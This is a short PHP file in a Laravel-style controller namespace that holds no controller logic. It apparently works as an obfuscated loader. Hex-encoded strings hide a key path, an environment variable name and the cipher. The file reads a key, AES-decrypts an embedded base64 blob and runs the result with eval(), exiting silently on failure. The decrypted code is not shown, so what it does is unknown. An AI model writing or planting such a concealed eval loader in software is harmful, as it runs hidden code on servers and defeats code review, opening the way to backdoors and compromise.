<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('X83cOtsign+H20XI0oM78A==');

$c=base64_decode(

'Nsk3WqWM2cS/V3CdlqlaIbLIEP6qY766756W/ymsxfKiGhH3RVgNd+Xf9/VucD1oW2oZvGvefRFz' .
'9HifMXQoGeyGFWOkNW9fhWzcgqiPWjGm9ocG72OTVZfv0xToNtFySaybs4s/a77XxEjEYLHQJX+b' .
'b01irnL+zWaBnsrMyxN7pIGHUYpHMuBLzN+r0pWU/4zN2sC88PMj4tgdAmpA3NwEoBjMbYLsImu5' .
'xgoeGL0='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

